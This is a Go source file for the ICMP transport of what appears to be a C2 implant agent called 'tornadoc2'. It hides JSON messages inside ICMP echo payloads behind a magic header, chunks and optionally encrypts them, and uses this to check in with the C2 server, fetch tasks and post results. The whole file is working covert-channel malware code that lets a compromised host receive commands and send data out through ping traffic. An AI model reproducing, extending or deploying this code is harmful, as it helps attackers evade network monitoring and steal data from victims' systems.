package transport

import (
	crand "crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"

	"tornadoc2/agent/crypto"
	"tornadoc2/agent/protocol"
)

const (
	icmpMagic    = "TC2\x01"
	icmpChunkLen = 900
	icmpMaxXfer  = 200
	icmpTimeout  = 15 * time.Second
	icmpDataMax  = 1400
)

type icmpTransport struct {
	host string
	sid  string

	mu  sync.Mutex
	seq int
}

func NewICMPTransport(host string) (*icmpTransport, error) {
	host = strings.TrimSpace(host)
	if host == "" {
		return nil, errors.New(
			"icmp transport: host is required")
	}

	return &icmpTransport{
		host: host,
		seq:  int(rand.Int31n(0x1000)),
	}, nil
}

func (t *icmpTransport) Name() string { return "icmp" }

func (t *icmpTransport) nextSeq() int {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.seq = (t.seq + 1) & 0xFFFF
	return t.seq
}

func (t *icmpTransport) randomXfer() string {
	var b [8]byte
	if _, err := crand.Read(b[:]); err != nil {
		binary.BigEndian.PutUint64(b[:],
			uint64(time.Now().UnixNano()))
	}
	return hex.EncodeToString(b[:])
}

func (t *icmpTransport) splitChunks(s string) []string {
	if s == "" {
		return nil
	}
	out := make([]string, 0, (len(s)+icmpChunkLen-1)/icmpChunkLen)
	for len(s) > icmpChunkLen {
		out = append(out, s[:icmpChunkLen])
		s = s[icmpChunkLen:]
	}
	if len(s) > 0 {
		out = append(out, s)
	}
	return out
}

func (t *icmpTransport) sendChunked(verb, sid,
	b64Payload string) ([]byte, error) {

	chunks := t.splitChunks(b64Payload)
	if len(chunks) == 0 {
		chunks = []string{""}
	}
	total := len(chunks)
	if total > icmpMaxXfer {
		return nil, fmt.Errorf(
			"icmp: payload needs %d chunks, limit is %d",
			total, icmpMaxXfer)
	}
	xfer := t.randomXfer()

	const attempts = 3
	var last []byte
	for i, c := range chunks {
		var (
			resp []byte
			err  error
		)
		for attempt := 0; attempt < attempts; attempt++ {
			resp, err = t.exchange(verb, sid, xfer, i,
				total, c)
			if err == nil {
				break
			}
			time.Sleep(time.Duration(100*(attempt+1)) *
				time.Millisecond)
		}
		if err != nil {
			return nil, fmt.Errorf(
				"icmp: chunk %d/%d xfer=%s: %w",
				i+1, total, xfer, err)
		}
		last = resp
	}
	return last, nil
}

func (t *icmpTransport) exchange(verb, sid, xfer string,
	seq, total int, chunk string) ([]byte, error) {

	msg := map[string]interface{}{
		"v":   verb,
		"sid": sid,
		"x":   xfer,
		"s":   seq,
		"t":   total,
		"c":   chunk,
	}
	body, err := json.Marshal(msg)
	if err != nil {
		return nil, err
	}
	data := append([]byte(icmpMagic), body...)
	if len(data) > icmpDataMax {
		return nil, fmt.Errorf(
			"icmp: chunk too large (%d bytes)", len(data))
	}

	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		if os.IsPermission(err) {
			return nil, errors.New(
				"icmp: raw socket requires CAP_NET_RAW or root")
		}
		return nil, err
	}
	defer c.Close()

	echoID := int(rand.Int31n(0xFFFF))
	echoSeq := t.nextSeq()

	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   echoID,
			Seq:  echoSeq,
			Data: data,
		},
	}
	wb, err := wm.Marshal(nil)
	if err != nil {
		return nil, err
	}

	dst := &net.IPAddr{IP: net.ParseIP(t.host)}
	if dst.IP == nil {
		return nil, fmt.Errorf("icmp: bad host %q", t.host)
	}

	if _, err := c.WriteTo(wb, dst); err != nil {
		return nil, err
	}

	deadline := time.Now().Add(icmpTimeout)
	if err := c.SetReadDeadline(deadline); err != nil {
		return nil, err
	}
	buf := make([]byte, 1500)
	for {
		n, peer, err := c.ReadFrom(buf)
		if err != nil {
			return nil, err
		}
		if !peer.(*net.IPAddr).IP.Equal(dst.IP) {
			continue
		}
		rm, err := icmp.ParseMessage(1, buf[:n])
		if err != nil {
			continue
		}
		if rm.Type != ipv4.ICMPTypeEchoReply {
			continue
		}
		reply, ok := rm.Body.(*icmp.Echo)
		if !ok {
			continue
		}
		if reply.ID != echoID || reply.Seq != echoSeq {
			continue
		}
		rd := reply.Data
		if len(rd) < len(icmpMagic) ||
			string(rd[:len(icmpMagic)]) != icmpMagic {
			continue
		}
		return rd[len(icmpMagic):], nil
	}
}

func (t *icmpTransport) CheckIn(identity Identity,
	pubkeyPEM, identitySig string, identityTs int64,
	wire *crypto.WireSession) (*CheckinResponse, error) {

	payload := CheckinRequest{Identity: identity}
	if pubkeyPEM != "" {
		payload.AgentPubKey = pubkeyPEM
	}
	if identitySig != "" {
		payload.IdentitySig = identitySig
		payload.IdentityTs = identityTs
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return nil, err
		}
	}
	raw, err := t.sendChunked("b", "new",
		base64.RawURLEncoding.EncodeToString(body))
	if err != nil {
		return nil, err
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(raw)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			raw = plain
		}
	}
	var out CheckinResponse
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
	var envelope struct {
		DNSID string `json:"_dns_sid"`
	}
	_ = json.Unmarshal(raw, &envelope)
	if envelope.DNSID == "" {
		return nil, errors.New(
			"checkin reply missing _dns_sid")
	}
	t.sid = envelope.DNSID
	return &out, nil
}

func (t *icmpTransport) FetchTasks(
	wire *crypto.WireSession) ([]protocol.Task, error) {

	if t.sid == "" {
		return nil, errors.New("tasks: no session")
	}
	epkChunk := ""
	if wire != nil {
		epk, err := wire.RotateEphemeral()
		if err != nil {
			return nil, fmt.Errorf("icmp: rotate epk: %w", err)
		}
		epkChunk = base64.RawURLEncoding.EncodeToString([]byte(epk))
	}
	raw, err := t.sendChunked("t", t.sid, epkChunk)
	if err != nil {
		return nil, err
	}
	if len(raw) == 0 {
		return nil, nil
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(raw)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			raw = plain
		}
	}
	var tasks []protocol.Task
	if err := json.Unmarshal(raw, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func (t *icmpTransport) PostResult(r protocol.Result,
	wire *crypto.WireSession) error {

	if t.sid == "" {
		return errors.New("results: no session")
	}
	body, err := json.Marshal(r)
	if err != nil {
		return err
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return err
		}
	}
	_, err = t.sendChunked("r", t.sid,
		base64.RawURLEncoding.EncodeToString(body))
	return err
}

func (t *icmpTransport) Close() error { return nil }